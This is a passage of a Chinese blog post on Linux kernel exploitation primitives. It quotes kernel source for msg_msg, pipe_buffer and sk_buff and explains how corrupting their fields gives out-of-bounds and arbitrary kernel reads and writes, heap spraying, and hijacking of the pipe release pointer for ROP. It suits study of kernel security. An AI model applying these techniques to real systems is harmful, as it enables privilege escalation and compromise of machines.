<p><code>MSG_COPY</code>位为1的时候,在<code>find_msg</code>中会返回<code>msg_msg</code>双向循环链表中，第<code>msgtyp</code>个<code>msg_msg</code>，也就是返回第<code>msgtyp</code>条消息，而不是根据<code>msgtyp</code>去和<code>msg-&gt;m_type</code>进行匹配</p>
<p>此外必须同时搭配<code>IPC_NOWAIT</code>标志</p>
<p>对于 <code>MSG_COPY</code> 而言，数据的拷贝使用的是 <code>copy_msg()</code> 函数，其会比对<strong>源消息的 m_ts 是否大于存储拷贝的消息的 m_ts ，若大于则拷贝失败</strong>，而后者则为我们传入 <code>msgrcv()</code> 的 <code>msgsz</code>，因此若我们仅读取单条消息则需要保证<strong>后者大于相等前者</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> msg_msg *<span class="title function_">copy_msg</span><span class="params">(<span class="keyword">struct</span> msg_msg *src, <span class="keyword">struct</span> msg_msg *dst)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">dst_pseg</span>, *<span class="title">src_pseg</span>;</span></span><br><span class="line">	<span class="type">size_t</span> len = src-&gt;m_ts;</span><br><span class="line">	<span class="type">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (src-&gt;m_ts &gt; dst-&gt;m_ts)<span class="comment">// 有个 size 检查</span></span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line"></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">	<span class="built_in">memcpy</span>(dst + <span class="number">1</span>, src + <span class="number">1</span>, alen);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (dst_pseg = dst-&gt;next, src_pseg = src-&gt;next;</span><br><span class="line">	     src_pseg != <span class="literal">NULL</span>;<span class="comment">//以源 msg 链表尾为终止</span></span><br><span class="line">	     dst_pseg = dst_pseg-&gt;next, src_pseg = src_pseg-&gt;next) &#123;</span><br><span class="line"></span><br><span class="line">		len -= alen;</span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		<span class="built_in">memcpy</span>(dst_pseg + <span class="number">1</span>, src_pseg + <span class="number">1</span>, alen);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	dst-&gt;m_type = src-&gt;m_type;</span><br><span class="line">	dst-&gt;m_ts = src-&gt;m_ts;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> dst;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>内存越界读</strong></p>
<p>在拷贝数据时对长度的判断主要依靠的是 <code>msg_msg-&gt;m_ts</code>，我们不难想到的是：若是我们能够控制一个 msg_msg 的 header，将其 m_sz 成员改为一个较大的数，我们就能够<strong>越界读取出最多将近一张内存页大小的数据</strong></p>
<p><strong>任意地址读</strong></p>
<p>对于大于一张内存页的数据而言内核会在 msg_msg 的基础上再补充加上 msg_msgseg 结构体，形成一个单向链表，我们不难想到的是：若是我们能够同时劫持 <code>msg_msg-&gt;m_ts</code> 与 <code>msg_msg-&gt;next</code>，我们<strong>便能够完成内核空间中的任意地址读</strong></p>
<p>但这个方法有一个缺陷，无论是 <code>MSG_COPY</code> 还是常规的接收消息，其拷贝消息的过程的判断主要依据还是单向链表的 next 指针，因此若我们需要完成对特定地址向后的一块区域的读取，<strong>我们需要保证该地址上的数据为 NULL</strong></p>
<p><strong>任意地址写</strong></p>
<p>当我们调用 msgsnd 系统调用时，其会调用 <code>load_msg()</code> 将用户空间数据拷贝到内核空间中，首先是调用 <code>alloc_msg()</code> 分配 <code>msg_msg</code> 单向链表，之后才是正式的拷贝过程<strong>，即空间的分配与数据的拷贝是分开进行的</strong></p>
<p>我们不难想到的是，<strong>在拷贝时利用 userfaultfd/FUSE 将拷贝停下来，在子进程中篡改 msg_msg 的 next 指针，在恢复拷贝之后便会向我们篡改后的目标地址上写入数据，从而实现任意地址写</strong></p>
<h2 id="pipe"><a href="#pipe" class="headerlink" title="pipe"></a>pipe</h2><h3 id="pipe-inode-info"><a href="#pipe-inode-info" class="headerlink" title="pipe_inode_info"></a>pipe_inode_info</h3><p><strong>申请obj大小:192</strong></p>
<p><strong>GFP_KERNEL_ACCOUNT:是</strong></p>
<p><strong>功能:泄露直接映射区地址</strong></p>
<p>在内核中，管道本质上是创建了一个<strong>虚拟的 inode</strong> 来表示的，对应的就是一个 <code>pipe_inode_info</code> 结构体（<code>inode-&gt;i_pipe</code>），其中包含了一个管道的所有信息，当我们创建一个管道时，内核会创建一个 VFS inode 与一个 pipe_inode_info 结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *	struct pipe_inode_info - a linux kernel pipe</span></span><br><span class="line"><span class="comment"> *	@mutex: mutex protecting the whole thing</span></span><br><span class="line"><span class="comment"> *	@rd_wait: reader wait point in case of empty pipe</span></span><br><span class="line"><span class="comment"> *	@wr_wait: writer wait point in case of full pipe</span></span><br><span class="line"><span class="comment"> *	@head: The point of buffer production</span></span><br><span class="line"><span class="comment"> *	@tail: The point of buffer consumption</span></span><br><span class="line"><span class="comment"> *	@note_loss: The next read() should insert a data-lost message</span></span><br><span class="line"><span class="comment"> *	@max_usage: The maximum number of slots that may be used in the ring</span></span><br><span class="line"><span class="comment"> *	@ring_size: total number of buffers (should be a power of 2)</span></span><br><span class="line"><span class="comment"> *	@nr_accounted: The amount this pipe accounts for in user-&gt;pipe_bufs</span></span><br><span class="line"><span class="comment"> *	@tmp_page: cached released page</span></span><br><span class="line"><span class="comment"> *	@readers: number of current readers of this pipe</span></span><br><span class="line"><span class="comment"> *	@writers: number of current writers of this pipe</span></span><br><span class="line"><span class="comment"> *	@files: number of struct file referring this pipe (protected by -&gt;i_lock)</span></span><br><span class="line"><span class="comment"> *	@r_counter: reader counter</span></span><br><span class="line"><span class="comment"> *	@w_counter: writer counter</span></span><br><span class="line"><span class="comment"> *	@fasync_readers: reader side fasync</span></span><br><span class="line"><span class="comment"> *	@fasync_writers: writer side fasync</span></span><br><span class="line"><span class="comment"> *	@bufs: the circular array of pipe buffers</span></span><br><span class="line"><span class="comment"> *	@user: the user who created this pipe</span></span><br><span class="line"><span class="comment"> *	@watch_queue: If this pipe is a watch_queue, this is the stuff for that</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">mutex</span>;</span></span><br><span class="line">	<span class="type">wait_queue_head_t</span> rd_wait, wr_wait;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> head;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> tail;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> max_usage;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> ring_size;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">	<span class="type">bool</span> note_loss;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> nr_accounted;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> readers;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> writers;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> files;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> r_counter;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> w_counter;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">tmp_page</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_readers</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_writers</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">watch_queue</span> *<span class="title">watch_queue</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>pipe_inode_info-&gt;bufs</code> 为一个动态分配的结构体数组，因此我们可以利用他来泄露出内核的“堆”上地址</p>
<h3 id="pipe-buffer"><a href="#pipe-buffer" class="headerlink" title="pipe_buffer"></a>pipe_buffer</h3><p><strong>申请obj大小:任意(默认1k</strong>)</p>
<p><strong>GFP_KERNEL_ACCOUNT:是</strong></p>
<p><strong>功能:泄露直接映射区地址</strong></p>
<p>当创建一个管道时,会自动创建<code>PIPE_DEF_BUFFERS(16)</code>个<code>pipe_buffer</code>,(只有在使用时才会按需分配初始化)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *	struct pipe_buffer - a linux kernel pipe buffer</span></span><br><span class="line"><span class="comment"> *	@page: the page containing the data for the pipe buffer</span></span><br><span class="line"><span class="comment"> *	@offset: offset of data inside the @page</span></span><br><span class="line"><span class="comment"> *	@len: length of data inside the @page</span></span><br><span class="line"><span class="comment"> *	@ops: operations associated with this buffer. See @pipe_buf_operations.</span></span><br><span class="line"><span class="comment"> *	@flags: pipe buffer flags. See above.</span></span><br><span class="line"><span class="comment"> *	@private: private data owned by the ops.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>offset是读取的偏移,len是可读的长度,写入的偏移是offset+len</p>
<p>一个管道的<code>pipe_buffer</code>数量是可以更改的</p>
<p>存在一个系统调用fcntl</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">pipe_fcntl</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line">    <span class="type">long</span> ret;</span><br><span class="line"></span><br><span class="line">    pipe = get_pipe_info(file, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (!pipe)</span><br><span class="line">        <span class="keyword">return</span> -EBADF;</span><br><span class="line"></span><br><span class="line">    __pipe_lock(pipe);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">    <span class="keyword">case</span> F_SETPIPE_SZ:</span><br><span class="line">        ret = pipe_set_size(pipe, arg);</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">pipe_set_size</span><span class="params">(<span class="keyword">struct</span> pipe_inode_info *pipe, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> size, nr_pages;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> user_bufs;</span><br><span class="line">	<span class="type">long</span> ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	size = round_pipe_size(arg);</span><br><span class="line">	nr_pages = size &gt;&gt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!nr_pages)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If trying to increase the pipe capacity, check that an</span></span><br><span class="line"><span class="comment">	 * unprivileged user is not trying to exceed various limits</span></span><br><span class="line"><span class="comment">	 * (soft limit check here, hard limit check just below).</span></span><br><span class="line"><span class="comment">	 * Decreasing the pipe capacity is always permitted, even</span></span><br><span class="line"><span class="comment">	 * if the user is currently over a limit.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (nr_pages &gt; pipe-&gt;buffers &amp;&amp;</span><br><span class="line">			size &gt; pipe_max_size &amp;&amp; !capable(CAP_SYS_RESOURCE))</span><br><span class="line">		<span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">	user_bufs = account_pipe_buffers(pipe-&gt;user, pipe-&gt;buffers, nr_pages);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (nr_pages &gt; pipe-&gt;buffers &amp;&amp;</span><br><span class="line">			(too_many_pipe_buffers_hard(user_bufs) ||</span><br><span class="line">			 too_many_pipe_buffers_soft(user_bufs)) &amp;&amp;</span><br><span class="line">			is_unprivileged_user()) &#123;</span><br><span class="line">		ret = -EPERM;</span><br><span class="line">		<span class="keyword">goto</span> out_revert_acct;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * We can shrink the pipe, if arg &gt;= pipe-&gt;nrbufs. Since we don&#x27;t</span></span><br><span class="line"><span class="comment">	 * expect a lot of shrink+grow operations, just free and allocate</span></span><br><span class="line"><span class="comment">	 * again like we would do for growing. If the pipe currently</span></span><br><span class="line"><span class="comment">	 * contains more buffers than arg, then return busy.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (nr_pages &lt; pipe-&gt;nrbufs) &#123;</span><br><span class="line">		ret = -EBUSY;</span><br><span class="line">		<span class="keyword">goto</span> out_revert_acct;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	bufs = kcalloc(nr_pages, <span class="keyword">sizeof</span>(*bufs),</span><br><span class="line">		       GFP_KERNEL_ACCOUNT | __GFP_NOWARN);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!bufs)) &#123;</span><br><span class="line">		ret = -ENOMEM;</span><br><span class="line">		<span class="keyword">goto</span> out_revert_acct;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * The pipe array wraps around, so just start the new one at zero</span></span><br><span class="line"><span class="comment">	 * and adjust the indexes.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (pipe-&gt;nrbufs) &#123;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> tail;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> head;</span><br><span class="line"></span><br><span class="line">		tail = pipe-&gt;curbuf + pipe-&gt;nrbufs;</span><br><span class="line">		<span class="keyword">if</span> (tail &lt; pipe-&gt;buffers)</span><br><span class="line">			tail = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			tail &amp;= (pipe-&gt;buffers - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">		head = pipe-&gt;nrbufs - tail;</span><br><span class="line">		<span class="keyword">if</span> (head)</span><br><span class="line">			<span class="built_in">memcpy</span>(bufs, pipe-&gt;bufs + pipe-&gt;curbuf, head * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line">		<span class="keyword">if</span> (tail)</span><br><span class="line">			<span class="built_in">memcpy</span>(bufs + head, pipe-&gt;bufs, tail * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pipe-&gt;curbuf = <span class="number">0</span>;</span><br><span class="line">	kfree(pipe-&gt;bufs);</span><br><span class="line">	pipe-&gt;bufs = bufs;</span><br><span class="line">	pipe-&gt;buffers = nr_pages;</span><br><span class="line">	<span class="keyword">return</span> nr_pages * PAGE_SIZE;</span><br><span class="line"></span><br><span class="line">out_revert_acct:</span><br><span class="line">	(<span class="type">void</span>) account_pipe_buffers(pipe-&gt;user, nr_pages, pipe-&gt;buffers);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当选项为<code>F_SETPIPE_SZ</code></p>
<p>其会修改当前pipe的bufs数组大小为第三个参数<code>(arg&gt;&gt;12)*sizeof(*bufs)</code></p>
<p>例如当我们使用<code>fcntl(pipe_fd, F_SETPIPE_SZ, 0x1000 * 64)</code>时</p>
<p>就会更改bufs从<code>kmalloc-cg-2k</code>进行分配</p>
<p>不过注意arg&gt;&gt;12必须是2的幂次方</p>
<hr>
<p><strong>劫持执行流</strong></p>
<p>当我们关闭了管道的两端时，会触发 <code>pipe_buffer-&gt;pipe_buffer_operations-&gt;release</code> 这一指针</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * -&gt;confirm() verifies that the data in the pipe buffer is there</span></span><br><span class="line"><span class="comment">	 * and that the contents are good. If the pages in the pipe belong</span></span><br><span class="line"><span class="comment">	 * to a file system, we may need to wait for IO completion in this</span></span><br><span class="line"><span class="comment">	 * hook. Returns 0 for good, or a negative error value in case of</span></span><br><span class="line"><span class="comment">	 * error.  If not present all pages are considered good.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">int</span> (*confirm)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * When the contents of this pipe buffer has been completely</span></span><br><span class="line"><span class="comment">	 * consumed by a reader, -&gt;release() is called.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">void</span> (*release)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Attempt to take ownership of the pipe buffer and its contents.</span></span><br><span class="line"><span class="comment">	 * -&gt;try_steal() returns %true for success, in which case the contents</span></span><br><span class="line"><span class="comment">	 * of the pipe (the buf-&gt;page) is locked and now completely owned by the</span></span><br><span class="line"><span class="comment">	 * caller. The page may then be transferred to a different mapping, the</span></span><br><span class="line"><span class="comment">	 * most often used case is insertion into different file address space</span></span><br><span class="line"><span class="comment">	 * cache.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">bool</span> (*try_steal)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Get a reference to the pipe buffer.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">bool</span> (*get)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>当执行到该指针时 rsi 寄存器刚好指向对应的 <code>pipe_buffer</code>，因此我们可以将函数表劫持到 <code>pipe_buffer</code> 上，找到一条合适的 gadget 将栈迁移到该处，从而更顺利地完成 ROP</p>
<p><strong>任意地址读写</strong></p>
<p>管道的读写通过 <code>pipe_buffer[i].page</code> 确定读写的内存，因此若我们能够修改 <code>page</code> 指针，则我们便能完成<strong>对整个物理内存区域的读操作，以及对直接映射区上有写权限的内存区域的写操作</strong></p>
<h2 id="sk-buff"><a href="#sk-buff" class="headerlink" title="sk_buff"></a>sk_buff</h2><p><strong>申请obj大小:&gt;=512</strong></p>
<p><strong>GFP_KERNEL_ACCOUNT:否</strong></p>
<p><strong>功能:堆喷</strong></p>
<p><code>sk_buff</code> 是 Linux kernel 网络协议栈中一个<strong>重要的基础结构体</strong>，其用以表示在网络协议栈中传输的一个「包」，但其结构体本身不包含一个包的数据部分，而是包含该包的各种属性，<strong>数据包的本体数据则使用一个单独的 object 储存</strong></p>
<p>这个结构体成员比较多，我们主要关注核心部分</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="comment">/* These two members must be first. */</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span>		*<span class="title">next</span>;</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span>		*<span class="title">prev</span>;</span></span><br><span class="line"></span><br><span class="line">			<span class="comment">// ...</span></span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* These elements must be at the end, see alloc_skb() for details.  */</span></span><br><span class="line">	<span class="type">sk_buff_data_t</span>		tail;</span><br><span class="line">	<span class="type">sk_buff_data_t</span>		end;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span>		*head,</span><br><span class="line">				*data;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		truesize;</span><br><span class="line">	<span class="type">refcount_t</span>		users;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SKB_EXTENSIONS</span></span><br><span class="line">	<span class="comment">/* only useable after checking -&gt;active_extensions != 0 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">skb_ext</span>		*<span class="title">extensions</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>sk_buff</code> 结构体与其所表示的数据包形成如下结构，其中：</p>
<ul>
<li><code>head</code> ：一个数据包<strong>实际的起始处</strong>（也就是为该数据包分配的 object 的首地址）</li>
<li><code>end</code> ：一个数据包实际的末尾（为该数据包分配的 object 的末尾地址）</li>
<li><code>data</code> ：<strong>当前所在 layer 的数据包对应的起始地址</strong></li>
<li><code>tail</code> ：<strong>当前所在 layer 的数据包对应的末尾地址</strong></li>
</ul>
<p>data 和 tail 可以这么理解：数据包每经过网络层次模型中的一层都会被添加/删除一个 header （有时还有一个 tail），data 与 tail 便是用以对此进行标识的</p>
<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/AV8HsnZj2bUCl4J.png" alt=""></p>
<p>多个 <code>sk_buff</code> 之间形成双向链表结构，类似于 <code>msg_queue</code>，这里同样有一个 <code>sk_buff_head</code> 结构作为哨兵节点</p>
<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/U8CjYMBOcZ74s3W.png" alt=""></p>
<p>在内核网络协议栈中很多地方都会用到该结构体，例如读写 socket 一类的操作都会造成包的创建，其最终都会调用到 <code>alloc_skb()</code> 来分配该结构体，而这个函数又是 <code>__alloc_skb()</code> 的 wrapper，不过需要注意的是其会从<strong>独立的</strong> <code>skbuff_fclone_cache</code>/ <code>skbuff_head_cache</code> 取 object</p>
<p><code>sk_buff</code> 虽然是从独立的 kmem_cache 中分配的，<strong>但其对应的数据包不是</strong></p>
